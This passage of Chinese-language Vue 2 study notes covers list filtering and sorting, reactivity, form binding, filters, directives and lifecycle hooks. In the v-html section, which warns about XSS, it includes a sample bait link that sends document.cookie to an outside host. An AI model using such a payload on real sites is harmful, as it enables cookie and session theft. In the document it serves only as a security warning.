        {id:'004', name:'温兆伦', age:22, sex:'男'}
      ]
    },
    computed: {
      filPersons() {
        return this.persons.filter((p) => {
          return p.name.indexOf(this.keyWord) !== -1;
        })
      }
    }
  })
</script>
```

### 1.13.4 列表排序

```javascript
<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <button @click="sortType = 2">升序</button>
  <button @click="sortType = 1">降序</button>
  <button @click="sortType = 0">原顺序</button>
  <ul>
    <li v-for="p of filPersons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el:'#root',
    data:{
      keyWord:'',
      sortType:0, // 0 原顺序 1 降序 2 升序
      persons:[
        {id:'001', name:'马冬梅', age:30, sex:'女'},
        {id:'002', name:'周冬雨', age:31, sex:'女'},
        {id:'003', name:'周杰伦', age:18, sex:'男'},
        {id:'004', name:'周杰伦', age:19, sex:'男'}
      ]
    },
    computed:{
      filPersons(){
        const arr = this.persons.filter((p) => {
          return p.name.indexOf(this.keyWord) !== -1;
        });
        if (this.sortType) {
          arr.sort((p1, p2) => {
            return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age;
          })
        }
        return arr;
      }
    }
  })
</script>
```

### 1.13.5 Vue数据监视

**更新数据时的问题**：

​	this.persons[0] = {id: '001', name:'马老师', age:50, sex:'男'}更改`data`数据, `Vue`不监听, 模板不改变.

```javascript
<div id="root">
    <h2>人员列表</h2>
    <button @click="updateMei">更新马冬梅的信息</button>
    <ul><li v-for="(p, index) of persons" :key="p.id">
        {{p.name}}-{{p.age}}-{{p.sex}}
    </li></ul>
</div>
<script>
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001', name:'马冬梅', age:30, sex:'女'},
                {id:'002', name:'周冬雨', age:31, sex:'女'},
                {id:'003', name:'周杰伦', age:18, sex:'男'},
                {id:'004', name:'周杰伦', age:19, sex:'男'}
            ]
        },
        methods:{
            updateMei(){
				// this.persons[0].name = '马老师'; //奏效
				// this.persons[0].age = 50; //奏效
				// this.persons[0].sex = '男'; //奏效
                // 先点开发者工具再点按钮, 不变化; 先点按钮, 再点开发者工具, 变化
				// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'}; //不奏效
				// 包裹数组的7个方法可以对数组进行响应式的修改
                this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'});
            }
        }
    })
</script>
```

**模拟一个数据监测**

```javascript
<script>
    let data = {
        name:'尚硅谷',
        address:'北京'
    }

    // 创建一个监视的实例对象, 用于监视data中属性的变化
    const obs = new Observer(data);
    console.log(obs);

    // 准备一个vm实例对象
    let vm = {};
    vm._data = data = obs;

    function Observer(obj) {
        // 汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj);
        // 遍历
        keys.forEach((k) => {
            Object.defineProperty(this, k, {
                get(){
                    return obj[k];
                },
                set(val){
                    console.log(`$(k)被改了, 我要去解析模板, 生成虚拟DOM...我要开始忙了`)
                    obj[k] = val;
                }
            })
        })
    }
</script>
```

**总结:Vue数据监测**

1. `Vue`会监视`data`中所有层次的数据

2. 如何监测**对象**中的数据?

   通过`setter`实现监测, 且要在`new Vue()`时就传入要监测的数据

   * 对象创建后追加的属性, `Vue`默认不做响应式处理

   * 如需给后添加的属性做响应式, 请使用如下API

     `Vue.set(target, propertyName/index, value)`

     `vm.$set(target, propertyName/index, value)`

3. 如何监测**数组**中的数据?

   通过包裹数组更新元素的方法实现, 本质就是做了两件事

   1. 调用原生对象的方法对数组进行更新
   2. 重新解析模板, 进而更新页面

4. 在`Vue`修改数组中的某个元素一定要用如下方法

   `push() pop() unshift() shift() splice() sort() reverse()`这几个方法被`Vue`重写了

   `Vue.set()`或`vm.$set()`

**特别注意: `Vue.set()` 和 `vm.$set()` 不能给 vm 或 vm的根数据对象(data等)添加属性**

```javascript
<div id="root">
    <h1>学生信息</h1>

    <button @click="student.age++">年龄++</button><br>
    <button @click="addSex">添加一个性别属性</button><br>
    <button @click="student.sex = '未知'">变换性别</button><br>
    <button @click="addFriend">在列表首位添加一个朋友</button><br>
    <button @click="updateFirstFriendName">修改第一个朋友的名字为: 张三</button><br>
    <button @click="addHobby">添加一个爱好</button><br>
    <button @click="updateHobby">修改第一个爱好为: 开车</button><br>
    <button @click="removeSmoke">过滤掉爱好中的抽烟</button>

    <h2>姓名: {{student.name}}</h2>
    <h2>年龄: {{student.age}}</h2>
    <h2 v-if="student.sex">性别: {{student.sex}}</h2>
    <h2>爱好</h2>
    <ul>
        <li v-for="(h, index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h2>朋友们</h2>
    <ul>
        <li v-for="(f, index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>
<script>
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            student:{
                name:'tom',
                age:18,
                hobby:['抽烟', '喝酒', '烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony', age:36}
                ]
            }
        },
        methods:{
            addSex(){
                // Vue.set(this.student, 'sex', '男');
                this.$set(this.student, 'sex', '男');
            },
            addFriend(){
                this.student.friends.unshift({name:'jack', age:'30'});
            },
            updateFirstFriendName(){
                this.student.friends[0].name = '张三';
            },
            addHobby(){
                this.student.hobby.push('学习')
            },
            updateHobby(){
                // this.student.hobby.unshift(0, 1, '开车');
                // Vue.set(this.student.hobby, 0, '开车');
                this.$set(this.student.hobby, 0, '开车');
            }
        }
    })
</script>
```

## 1.14 收集表单数据

**收集表单数据**

* 若`<input type="text">`, 则v-model收集的是**value**值, 用户输入的就是`value`值
* 若`<input type="radio">`, 则v-model收集的是**value**值, 且要给标签配置`value`值
* 若`<input type="checkbox">`
  1. 没有配置`input`的`value`属性, 那么收集的就是**checked**(勾选 or 未勾选, 是布尔值)
  2. 配置`input`的`value`属性:
     1. `v-model`的初始值是**非数组**, 那么收集的就是**checked**(勾选 or 未勾选, 是布尔值)
     2. `v-model`的初始值是**数组**, 那么收集的就是**value**组成的数组

**备注: v-model的三个修饰符:**

1. `lazy`: 失去焦点再收集数据
2. `number`: 输入字符串转为有效的数字
3. `trim`: 输入首尾空格过滤

```javascript
<div id="root">
    <form @submit.prevent="demo">
        账号: <input type="text" v-model.trim="userInfo.account"><br><br>
        密码: <input type="password" v-model="userInfo.password"><br><br>
        年龄: <input type="age" v-model="userInfo.age"><br><br>
        性别:
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
        <br><br>
        爱好:
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        <br><br>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br><br>
        其他信息:
        <textarea v-model.lazy="userInfo.other"></textarea><br><br>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://aiguigu.com">《用户协议》</a>
        <br><br>
        <button>提交</button>
    </form>
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            userInfo:{
                account:'',
                password:'',
                age:18,
                sex:'female',
                hobby:[],
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods:{
            demo(){
                console.log(JSON.stringify(this.userInfo));
            }
        }
    })
</script>
```

## 1.15 过滤器(Vue3 已经移除)

定义：**对要显示的数据进行特定格式化后再显示**（适用于一些简单逻辑的处理）。
语法：

​		1.注册过滤器：`Vue.filter(name,callback)` (全局过滤器)或 `new Vue{filters:{}}`(局部过滤器)
​		2.使用过滤器：`{{ xxx | 过滤器名}}`  或  `v-bind:属性 = "xxx | 过滤器名"`
备注：
​		1.过滤器也可以接收额外参数、多个过滤器也可以串联
​		2.并没有改变原本的数据, 是产生新的对应的数据

处理时间的库`moment`体积较大, `dayjs`较轻量级

```javascript
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是: {{fmtTime}}</h3>
    <!-- methods实现 -->
    <h3>现在是: {{getFmtTime()}}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是: {{time | timeFormater}}</h3>
    <!-- 过滤器实现(传参) -->
    <h3 :x="msg | mySlice">现在是: {{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
</div>
<div id="root2">
    <h2>{{msg | mySlice}}</h2>
</div>
<script>
    Vue.config.productionTip = false;
    Vue.filter('mySlice', function(value) {
        return value.slice(0, 4);
    })

    new Vue({
        el:'#root',
        data:{
            time:1652023604039, // 时间戳
            msg:'你好, 尚硅谷'
        },
        computed:{
            fmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss');
            }
        },
        methods:{
            getFmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss');
            }
        },
        // 局部过滤器
        filters:{
            timeFormater(value, str='YYYY年MM月DD日 HH:mm:ss') {
                // console.log('@', value);
                return dayjs(value).format(str);
            }
        }
    })
    new Vue({
        el:'#root2',
        data:{
            msg:'hello, atguigu!'
        }
    })
</script>
```

## 1.16 内置指令

之前学过的指令：

| 指令        | 功能                            |
| ----------- | ------------------------------- |
| `v-bind`    | 单向绑定解析表达式, 可简写为`:` |
| `v-model`   | 双向数据绑定                    |
| `v-for`     | 遍历数组/对象/字符串            |
| `v-on`      | 绑定事件监听, 可简写为`@`       |
| `v-show`    | 条件渲染(动态控制节点是否展示)  |
| `v-if`      | 条件渲染(动态控制节点是否存在)  |
| `v-else-if` | 条件渲染(动态控制节点是否存在)  |
| `v-else`    | 条件渲染(动态控制节点是否存在)  |

### 1.16.1 v-text指令

`v-text`指令

作用: 向其所在的节点中渲染文本内容

**与插值语法的区别**: `v-text`会替换掉节点中的内容, `{{xxx}}`则不会, 更灵活

```javascript
<div id="root">
    <div>你好, {{name}}</div>
    <div v-text="name">你好, </div>
    <div v-text="str"></div>
</div>
<script>
    Vue.config.producitonTip = false;
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷',
            str:'<h3>你好, 尚硅谷</h3>'
        }
    })
</script>
```

### 1.16.2 v-html指令

`v-html`指令

作用: 向指定节点中渲染包含`html`结构的内容

**与插值语法的区别**:

1. `v-html`会替换掉节点中的所有的内容, `{{xxx}}`则不会
2. `v-html`可以识别`html`结构

特别注意`v-html`有安全性问题！！！

1. 在网站上动态渲染任意`html`是非常危险的, 容易导致**XSS**go那估计
2. 一定要在可信的内容上使用`v-html`, 永远不要用在用户提交的内容上！！！

```javascript
<div id="root">
    <div>你好, {{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷',
            str:'<h3>你好啊!</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```

### 1.16.3 v-cloak指令

`v-cloak`指令(没有值)

1. 本质是一个特殊属性, `Vue`实例创建完毕并接管容器后, 会删掉`v-cloak`属性
2. 使用`css`配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题

```javascript
<style>
	[v-cloak]{
		display:none;
	}
</style>
<body>
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<!-- 延迟5s收到vue.js -->
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
</body>
```

### 1.16.4 v-once指令

* `v-once`所在节点在初次动态渲染后, 就视为静态内容了
* 以后数据的改变不会引起`v-once`所在结构的更新, 可以用来优化性能

```javascript
<div id="root">
    <h2 v-once>初始化的n值是:{{n}}</h2>
    <h2>当前的n值是:{{n}}</h2>
    <button @click="n++">n++</button>
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

### 1.16.5 v-pre指令

1. 跳过`v-pre`所在节点的编译过程
2. 可利用它跳过: 没有使用指令语法、没有使用插值语法的节点，会加快编译

```javascript
<div id="root">
    <h2 v-pre>没有任何和Vue相关的内容</h2>
    <h2>当前的n值是:{{n}}</h2>
    <button @click="n++">n++</button>
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

## 1.17 自定义指令

```javascript
/*
一、定义语法：
	(1)局部指令：
		new Vue({								new Vue({
			directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
		}) 										})	
	(2)全局指令：
		Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
二、配置对象中常用的3个回调：
	(1)bind：指令与元素成功绑定时调用。
	(2)inserted：指令所在元素被插入页面时调用。
	(3)update：指令所在模板结构被重新解析时调用。
三、备注：
	1.指令定义时不加v-，但使用时要加v-；
	2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
*/

// 局部指令-回调函数写法
big(element, binding) {
	element.innerText = binding.value * 10;
},
// 局部指令-配置对象写法
fbind:{
    bind(element, binding){
        element.value = binding.value;
    },
    inserted(element, binding){
        element.focus();
    },
    update(element, binding){
        element.value = binding.value;
    }
}
// 全局指令-回调函数写法
Vue.directive('big', function(element, binding){
	element.innerText = binding.value * 10;
})
// 全局指令-配置对象写法
Vue.directive('fbind', {
    bind(element, binding){
		element.value = binding.value;
    },
    inserted(element, binding){
		element.focus();
	},
	update(element, binding){
		element.value = binding.value ;
	}
});
```

**回顾一个DOM操作**

```javascript
<style>.demo{background-color: orange;}</style>
<button id="btn">点我创建一个输出框</button>
<script>
    const btn = document.getElementById('btn');
    btn.onclick = () => {
        const input = document.createElement('input');
        
        input.className = 'demo';
        input.value = 99;
        input.onclick = () => {alert(1)};

        document.body.appendChild(input);
        
        input.parentElement.style.backgroundColor = 'skyblue';
        // console.log(input.parentElement);
        input.focus();
    }
</script>
```

**自定义指令**

```javascript
<div id="root">
    <h2>{{name}}</h2>
    <h2>当前的n值是: <span v-text="n"></span></h2>
    <!-- <h2>放大10倍后的n值是: <span v-big-number="n"></span></h2> -->
    <h2>放大10倍后的n值是: <span v-big="n"></span></h2>
    <button @click="n++">n++</button>
    <hr>
    <input type="text" v-fbind:value="n">
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷',
            n:1
        },
        directives:{
            // 什么时候被调用? 1.指令与元素成功绑定时. 2.指令所在的模板被重新解析时
            // 'big-number'(element, binding) {
            //     // console.log(element, binding.value);
            //     element.innerText = binding.value * 10;
            // },
            big(element, binding) {
                console.log('big', this); // 注意此处的this是window
                // console.log(element, binding.value);
                element.innerText = binding.value * 10;
            },

            // fbind(element, binding) {
            //     element.value = binging.value;
            //     element.focus();
            // }
            fbind:{
                // 指令与元素成功绑定时
                bind(element, binding){
                    // console.log('bind');
                    element.value = binding.value;
                },
                // 指令所在元素被插入页面时
                inserted(element, binding){
                    // console.log('inserted');
                    element.focus();
                },
                // 指令所在的模板被重新解析时
                update(element, binding){
                    // console.log('update');
                    element.value = binding.value ;
                }
            }
        }
    })
</script>
```

## 1.18 声明周期

### 1.18.1 引出生命周期

**生命周期**

1. 又名**生命周期回调函数**, 生命周期函数, 生命周期钩子
2. 是什么: `Vue`在关键时刻帮我们调用的一些特殊名称的函数
3. **生命周期函数的名字不可更改**, 但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的**this**指向是`vm`或`组件实例对象`

```javascript
<body>
    <div id="root">
        <h2 v-if="a">你好啊</h2>
        <h2 :style="{opacity}">欢迎学习Vue</h2>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            opacity:1
        },
        methods: {
        },
        // Vue完成模板的解析并把初始的真实DOM元素放入页面后(挂载完毕)调用mounted
        mounted(){
            console.log('mounted', this);
            setInterval(() => {
                this.opacity -= 0.01;
                if (this.opacity <= 0) this.opacity = 1;
            }, 20);
        }
    })
    // 通过外部的定时器实现(不推荐)
    // setInterval(() => {
    //     vm.opacity -= 0.01;
    //     if (vm.opacity <= 0) vm.opacity = 1;
    // }, 20);
</script>
```

### 1.18.2 分析生命周期

<img src="D:\桌面\生命周期.png" alt="生命周期" style="zoom:50%;" />

```javascript
<div id="root">
    <h2 v-text="n"></h2>
    <h2>当前的n值是:{{n}}</h2>
    <button @click="add">点我n+1</button>
    <button @click="bye">点我销毁vm</button>
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        template: `
        <div>
            <h2>当前的n值是:{{n}}</h2>
            <button @click="add">点我n+1</button>
        </div>
        `,
        data: {
            n: 1
        },
        methods: {
            add() {
                console.log('add');
                this.n++;
            },
            bye() {
                console.log('bye');
                this.$destroy();
            }
        },
        watch: {
            n() {
                console.log('n变了');
            }
        },
        beforeCreate() {console.log('beforeCreate')},
        created() {console.log('created')},
        beforeMount() {console.log('beforeMount')},
        mounted() {console.log('mounted')},
        beforeUpdate() {console.log('beforeUpdate')},
        updated() {console.log('updated')},
        beforeDestroy() {console.log('beforeDestroy')},
        destroyed() {console.log('destroyed')}
    })
</script>
```

### 1.18.3 总结生命周期

**总结**

常用的生命周期钩子

1. `mounted`发送`ajax`请求、启动定时器、绑定自定义事件、订阅消息等初始化操作
2. `beforeDestroy`清除定时器、解绑自定义事件、取消订阅消息等首位工作

关于**销毁**`Vue`实例

1. 销毁后借助`vue`开发者工具看不到任何信息
2. 销毁后自定义事件会失效, 但原生`DOM`事件依然有效
3. 一般不会在`beforeDestroy`操作数据, 因为即便操作数据, 也不会再触发更新流程了

```javascript
<div id="root">
    <h2 :style="{opacity}">欢迎学习Vue</h2>
    <button @click="opacity = 1">透明度设置为1</button>
    <button @click="stop">点我停止变换</button>
</div>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            opacity:1
        },
        methods:{
            stop(){
                this.$destroy();
            }
        },
        // Vue完成模板的解析并把初始的真实DOM元素放入页面后(挂载完毕)调用mounted
        mounted(){
            console.log("mounted", this);
            this.timer = setInterval(() => {
                console.log('setInterval');
                this.opacity -= 0.01;
                if (this.opacity <= 0) this.opacity = 1;
            }, 16)
        },
        beforeDestroy() {
            clearInterval(this.timer);
            console.log('vm即将驾鹤西游了');
        },
    })
</script>
```

